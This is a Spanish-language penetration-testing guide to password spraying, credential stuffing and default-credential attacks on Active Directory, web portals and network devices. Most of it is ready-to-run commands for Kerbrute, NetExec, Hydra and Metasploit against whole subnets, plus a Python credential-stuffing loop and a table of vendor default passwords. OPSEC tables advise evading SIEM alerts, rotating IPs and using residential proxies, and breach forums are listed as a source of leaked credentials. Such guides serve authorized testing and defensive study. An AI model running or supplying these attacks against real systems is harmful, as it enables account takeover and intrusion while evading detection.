# Password Spraying, Stuffing y Credenciales por Defecto

### 1. Password Spraying

#### ¿Qué es?

El spraying invierte la lógica del brute-force clásico: en lugar de probar muchas contraseñas contra un usuario, prueba **una sola contraseña contra muchos usuarios**. Esto evita superar el umbral de lockout por cuenta.

Es especialmente eficaz en **Active Directory**, donde:

* Las políticas de lockout son **por usuario**, no globales
* Las contraseñas corporativas siguen patrones predecibles (`Empresa2024!`, `Welcome1`, `Changeme123!`)
* Un dominio puede tener miles de usuarios — la superficie es amplia

#### Fase previa: enumerar la política de lockout

Antes de lanzar cualquier spray, obtener la política de bloqueo es obligatorio:

```bash
# Con NetExec (requiere credenciales válidas o null session)
netexec smb <target> -u <user> -p <pass> --pass-pol

# Con enum4linux (null session en entornos legacy)
enum4linux -P <target>

# Con PowerView (desde dentro del dominio)
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
# Clave: LockoutBadCount (umbral), ResetLockoutCount (ventana en minutos)
```

**Regla de oro:** nunca superar `LockoutBadCount - 1` intentos por cuenta en la ventana definida por `ResetLockoutCount`.

#### Herramientas

**Kerbrute (vía Kerberos — sigiloso)**

```bash
# Enumerar usuarios válidos primero
kerbrute userenum -d dominio.local --dc 192.168.1.10 users.txt

# Spraying
kerbrute passwordspray -d dominio.local --dc 192.168.1.10 users.txt 'Password2024!'
```

> Ventaja: usa preautenticación Kerberos (AS-REQ), que en muchas configs **no genera eventos de lockout** ni alertas de SIEM. Más silencioso que NTLM.

**NetExec (vía SMB/LDAP/WinRM)**

```bash
# Spray básico
netexec smb 192.168.1.10 -u users.txt -p 'Password2024!' --continue-on-success

# Spray en rango de red completo
netexec smb 192.168.1.0/24 -u users.txt -p 'Password2024!' --continue-on-success

# Múltiples contraseñas SIN bruteforce (una combinación user+pass por intento)
netexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce
```

> `--no-bruteforce` prueba user\[0]:pass\[0], user\[1]:pass\[1]... en lugar del producto cartesiano. Útil para listas de pares inferidos.

**Hydra (para aplicaciones web)**

```bash
hydra -L users.txt -p 'Password2024!' \
  https-post-form://app.empresa.com/login \
  "/login:username=^USER^&password=^PASS^:Invalid credentials"
```

**Burp Suite (web — control granular)**

Usar **Pitchfork** con lista de usuarios fija y contraseña única. Permite inspeccionar respuestas HTTP, gestionar cookies/CSRF tokens y controlar el rate.

#### Timing y gestión de lockout

```bash
# Ronda 1
netexec smb <target> -u users.txt -p 'Password2024!' --continue-on-success

# Esperar la ventana de reset (ej. 30 min)
sleep 1800

# Ronda 2 con contraseña diferente
netexec smb <target> -u users.txt -p 'Welcome1!' --continue-on-success
```

#### OPSEC

| Riesgo                                        | Mitigación                                     |
| --------------------------------------------- | ---------------------------------------------- |
| Alertas de SIEM por múltiples AS-REQ fallidos | Kerbrute con bajo rate (`--delay`)             |
| Evento 4625 (logon fallido) en cantidad       | Limitar a 1 contraseña/ronda, respetar ventana |
| Bloqueo de cuenta                             | Consultar política antes, umbral-1 siempre     |
| Correlación por IP de origen                  | Pulverizar desde múltiples hosts si es posible |

***

### 2. Credential Stuffing

#### ¿Qué es?

El stuffing usa **pares `usuario:contraseña` reales** extraídos de brechas públicas y los prueba contra otros servicios, aprovechando la **reutilización de credenciales**.

No es fuerza bruta — son credenciales potencialmente válidas probadas en un contexto diferente. La eficacia depende directamente de la tasa de reutilización del objetivo.

#### Fuentes de credenciales filtradas

* **HaveIBeenPwned** — verificar si emails objetivo aparecen en brechas conocidas
* **Dehashed** (pago) — búsqueda por dominio, email, hash
* **IntelligenceX** — motor de búsqueda OSINT con dumps indexados
* **Breachforums / foros de acceso** — dumps recientes (uso forense/investigativo)
* **SecLists** — `SecLists/Passwords/Leaked-Databases/`

> En un pentest con scope autorizado, el cliente puede facilitar una lista de emails corporativos para cruzar contra HaveIBeenPwned y determinar exposición real.

#### Formato esperado

La mayoría de herramientas esperan el formato `usuario:contraseña`:

```
jdoe@empresa.com:Hunter2!
maria.garcia:Verano2019
admin:Password123
```

#### Herramientas

**Hydra (SSH, FTP, HTTP)**

```bash
# SSH
hydra -C leaked_credentials.txt ssh://10.100.38.23

# HTTP POST
hydra -C leaked_credentials.txt \
  https-post-form://app.empresa.com/login \
  "/login:user=^USER^&pass=^PASS^:Invalid"

# FTP
hydra -C leaked_credentials.txt ftp://192.168.1.50
```

**NetExec (SMB, LDAP, WinRM, RDP)**

```bash
# Stuffing contra SMB con lista de pares
netexec smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce

# WinRM (útil si hay acceso remoto PowerShell)
netexec winrm 192.168.1.10 -u users.txt -p passwords.txt --no-bruteforce
```

**Script Python personalizado (para APIs/portales con CSRF/MFA)**

```python
import requests

creds = open("leaked.txt").readlines()
session = requests.Session()

for line in creds:
    user, passwd = line.strip().split(":", 1)
    r = session.post("https://portal.empresa.com/api/login",
                     json={"email": user, "password": passwd})
    if r.status_code == 200 and "token" in r.json():
        print(f"[+] VÁLIDO: {user}:{passwd}")
```

#### Vectores de alto valor

| Servicio                    | Por qué es atractivo                        |
| --------------------------- | ------------------------------------------- |
| VPN corporativa (SSL/IPsec) | Acceso directo a red interna                |
| Citrix / RDP Gateway        | Escritorio remoto completo                  |
| Office 365 / Azure AD       | Email, SharePoint, Teams                    |
| Portales de RRHH / nómina   | Datos sensibles, posible escalada           |
| GitHub / GitLab corporativo | Código fuente, secrets en repos             |
| Panel de Datos101 / backups | Infraestructura de clientes (contexto MSSP) |

#### OPSEC

| Riesgo                              | Mitigación                                             |
| ----------------------------------- | ------------------------------------------------------ |
| Rate limiting / WAF                 | Añadir delays entre requests, rotar IPs/User-Agents    |
| MFA activo                          | Identifica cuentas válidas igualmente (error distinto) |
| Alertas de login desde IPs externas | Usar proxies residenciales si scope lo permite         |
| Logs de autenticación               | Distribuir intentos en tiempo                          |

### 3. Credenciales por Defecto

#### ¿Qué es?

Dispositivos y aplicaciones salen de fábrica con credenciales conocidas y documentadas. Si el administrador no las cambia durante la configuración, representan un acceso trivial — sin necesidad de cracking.

#### Contextos más comunes

* Routers, switches, firewalls (Cisco, Mikrotik, Fortinet...)
* Cámaras IP y sistemas de vigilancia
* Impresoras con panel web
* Appliances de backup (contexto relevante en MSSP)
* Interfaces de gestión: iLO, iDRAC, IPMI, BMC
* Bases de datos instaladas por defecto
* Herramientas DevOps: Jenkins, Tomcat, Grafana, Kibana

#### Recursos de referencia

* `https://www.default-password.info`
* `https://cirt.net/passwords`
* `https://github.com/ihebski/DefaultCreds-cheat-sheet`
* SecLists: `SecLists/Passwords/Default-Credentials/`

#### Herramienta: DefaultCreds-cheat-sheet

```bash
pip3 install defaultcreds-cheat-sheet

# Buscar por producto/vendor
creds search linksys
creds search cisco
creds search tomcat
creds search fortinet
```

#### Tabla de credenciales por defecto habituales

| Producto           | Usuario       | Contraseña           |
| ------------------ | ------------- | -------------------- |
| Cisco IOS          | cisco         | cisco                |
| Cisco ASA (ASDM)   | admin         | admin / (vacía)      |
| Fortinet FortiGate | admin         | (vacía)              |
| HP iLO             | Administrator | (en etiqueta física) |
| Dell iDRAC         | root          | calvin               |
| IPMI genérico      | ADMIN         | ADMIN                |
| MySQL              | root          | (vacía)              |
| PostgreSQL         | postgres      | postgres             |
| Apache Tomcat      | tomcat        | tomcat / s3cret      |
| Jenkins            | admin         | admin                |
| Grafana            | admin         | admin                |
| Kibana             | elastic       | changeme             |
| Printer panels     | admin         | admin / 1234         |
| Linksys (router)   | admin         | admin                |
| Netgear            | admin         | password             |
| MikroTik           | admin         | (vacía)              |

#### Herramientas y ejemplos

**NetExec (sweep rápido en red interna)**

```bash
# Credenciales comunes contra SMB en toda la subred
netexec smb 192.168.1.0/24 -u admin -p admin
netexec smb 192.168.1.0/24 -u administrator -p ''
netexec smb 192.168.1.0/24 -u admin -p ''

# Con lista de defaults de SecLists
netexec smb 192.168.1.0/24 \
  -u /usr/share/seclists/Passwords/Default-Credentials/default-usernames.txt \
  -p /usr/share/seclists/Passwords/Default-Credentials/default-passwords.txt \
  --no-bruteforce
```

**Hydra (dispositivos de red / HTTP)**

```bash
# Router con panel HTTP
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \
  192.168.1.1 http-get /

# Tomcat manager
hydra -C /usr/share/seclists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt \
  192.168.1.100 http-get /manager/html
```

**Metasploit (módulos específicos)**

```bash
# Escáner de credenciales por defecto para múltiples servicios
use auxiliary/scanner/multi/ssh/ssh_login
set RHOSTS 192.168.1.0/24
set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/default_userpass_for_services_unhashed.txt
run
```

#### Estrategia en reconocimiento interno

En una red interna (pentest o auditoría), el flujo recomendado es:

1. **Descubrimiento**: `nmap -sV 192.168.1.0/24` — identificar servicios y versiones
2. **Fingerprinting de productos**: banner grabbing, páginas de login con logos
3. **Búsqueda de defaults**: `creds search <producto>` o SecLists
4. **Sweep rápido**: NetExec con `admin:admin` y `administrator:` en todos los hosts SMB
5. **Verificación manual**: confirmar accesos en paneles web antes de escalar

> En contexto MSSP, los appliances de backup de clientes (Datos101 y similares) pueden tener paneles de administración accesibles con credenciales de fábrica si nunca fueron hardened. Documentar como hallazgo crítico.

### Comparativa de técnicas

| Técnica             | Requiere                     | Lockout risk                | Efectividad          | Entorno ideal       |
| ------------------- | ---------------------------- | --------------------------- | -------------------- | ------------------- |
| Password Spraying   | Lista de usuarios válidos    | Alto si no se gestiona bien | Media-Alta           | Active Directory    |
| Credential Stuffing | Dump de brecha externa       | Bajo (creds válidas)        | Alta en consumidores | Servicios web, VPN  |
| Default Credentials | Identificar producto/versión | Ninguno                     | Muy alta si aplica   | Redes internas, IoT |
